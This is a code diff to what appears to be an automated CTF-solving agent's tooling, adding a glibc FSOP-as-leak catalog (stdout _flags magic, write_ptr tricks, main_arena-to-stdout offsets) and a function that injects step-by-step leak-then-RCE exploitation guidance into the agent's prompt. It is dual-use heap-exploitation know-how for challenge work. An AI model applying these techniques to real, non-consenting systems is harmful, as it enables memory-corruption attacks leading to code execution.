@@ -195,6 +195,125 @@ LIBC_RCE_PATHS: dict[str, list[dict[str, str]]] = {
 }
 
 
+# FSOP-as-leak catalog. Job 37b33d2a741b's chal had setvbuf(stdout,
+# _IONBF) which led judge#1 to rule out _IO_write_base manipulation
+# ("not flushed under unbuffered"). The official solver showed that a
+# crafted `_flags` magic + write_ptr LSB trick DOES leak even under
+# _IONBF — the unbuffered branch still emits when _flags has the right
+# bits AND write_ptr > write_base. This catalog documents the magic
+# values + main_arena→stdout distance so future runs surface the
+# possibility before the conservative ruling.
+LIBC_LEAK_VIA_FSOP: dict[str, dict[str, object]] = {
+    # glibc 2.27..2.33 — _IO_2_1_stdout_ at libc + (offset varies per
+    # version, but main_arena→stdout distance is stable per build).
+    # main_arena.bins[0] (= main_arena+0x60) is the typical libc
+    # address surfaced on the heap via unsorted-bin fd/bk.
+    "2.27": {
+        "stdout_flags_magic": 0xfbad1800,
+        "magic_meaning": (
+            "_IO_MAGIC (0xfbad0000) | _IO_USER_BUF (0x1) "
+            "| _IO_NO_WRITES (0x8) — emits buffer even under _IONBF "
+            "because the unbuffered-write path checks magic, not the "
+            "_IO_UNBUFFERED bit"
+        ),
+        "write_ptr_lsb_zero": True,
+        "main_arena_to_stdout_typical": (
+            "ubuntu 18.04 libc-2.27: ~0xa00. main_arena.bins[0] = "
+            "main_arena+0x60; stdout = main_arena + (~0xa00-0x60). "
+            "Verify with `p (uint64_t)stdout - (uint64_t)&main_arena` "
+            "in gdb against the chal's bundled libc."
+        ),
+    },
+    "2.34": {
+        "stdout_flags_magic": 0xfbad1800,
+        "magic_meaning": "Same as 2.27 — magic survives across versions.",
+        "write_ptr_lsb_zero": True,
+        "main_arena_to_stdout_typical": (
+            "ubuntu 22.04 libc-2.35: ~0xa00. Same calculation."
+        ),
+    },
+    "2.39": {
+        "stdout_flags_magic": 0xfbad1800,
+        "magic_meaning": "Same magic.",
+        "write_ptr_lsb_zero": True,
+        "main_arena_to_stdout_typical": (
+            "ubuntu 24.04 libc-2.39: 0xb00 (verified on job "
+            "37b33d2a741b — official solver computes "
+            "stdout - main_arena = 0xb00). main_arena.bins[0] = "
+            "main_arena + 0x60; the unsorted-bin chunk fd/bk reach "
+            "this address."
+        ),
+    },
+}
+
+
+def render_fsop_leak_table(libc_version: str | None) -> str:
+    """Render the FSOP-as-leak entry for the pre-recon prompt.
+
+    When unsorted-bin attack / hook-overwrite leak channels look
+    blocked, the FSOP-leak path (write_base/write_ptr corruption via
+    a long-range single OOB write) is often the next viable vector
+    on modern glibc. This block puts the canonical magic in front
+    of pre-recon so it doesn't have to derive it from web searches
+    (which the main agent can't run anyway under subagent isolation).
+
+    The trick: heap typically has main_arena.bins[0] (= main_arena
+    + 0x60) sitting in an unsorted-bin chunk's fd. If you can forge
+    that as a fake std::string._M_p, a memcpy of length
+    (main_arena_to_stdout + sizeof(_IO_FILE_plus)) spans from
+    main_arena across to stdout — single OOB write touches all of
+    main_arena and the stdout FILE struct.
+    """
+    if not libc_version:
+        return ""
+    target_key = _pick_key_leak(libc_version)
+    if not target_key:
+        return ""
+    e = LIBC_LEAK_VIA_FSOP[target_key]
+    return (
+        f"FSOP-AS-LEAK TABLE — glibc {target_key} (matched against "
+        f"detected {libc_version}). Consider this BEFORE concluding "
+        f"'no leak channel'. Especially when:\n"
+        f"  - stdout is _IONBF (setvbuf(_, NULL, _IONBF, 0)) — the\n"
+        f"    naive ruling 'unbuffered ⇒ no write_base trick' is WRONG\n"
+        f"    when the magic below is used.\n"
+        f"  - heap surfaces a libc pointer in unsorted-bin fd/bk =\n"
+        f"    main_arena.bins[0] (= main_arena+0x60).\n"
+        f"  - the OOB write primitive lets you control the byte\n"
+        f"    LENGTH (e.g. cin >> name has no cap).\n\n"
+        f"Magic for `_IO_2_1_stdout_._flags`:\n"
+        f"  0x{e['stdout_flags_magic']:x}  ← {e['magic_meaning']}\n"
+        f"write_ptr LSB → 0x00 (keep write_ptr > write_base while\n"
+        f"forcing flush at an aligned offset).\n\n"
+        f"Distance: {e['main_arena_to_stdout_typical']}\n\n"
+        f"Leak shape: forge fake std::string with _M_p = main_arena.bins[0];\n"
+        f"send a name of length ≥ (main_arena_to_stdout + 0x40); the\n"
+        f"memcpy fills main_arena…stdout with crafted bytes; next cout\n"
+        f"emits the buffer (leak observable). Then a second OOB write\n"
+        f"on the same fake-string slot lands an FSOP _IO_wfile_jumps\n"
+        f"chain (see RCE TARGET TABLE)."
+    )
+
+
+def _pick_key_leak(version: str) -> str | None:
+    """Largest catalog key ≤ version (semver-style)."""
+    try:
+        v_tup = _parse(version)
+    except Exception:
+        return None
+    best: str | None = None
+    best_tup: tuple[int, int] = (0, 0)
+    for k in LIBC_LEAK_VIA_FSOP:
+        try:
+            k_tup = _parse(k)
+        except Exception:
+            continue
+        if k_tup <= v_tup and k_tup >= best_tup:
+            best = k
+            best_tup = k_tup
+    return best
+
+
 def render_rce_table(libc_version: str | None) -> str:
     """Render an RCE candidate block for the pre-recon prompt.
 
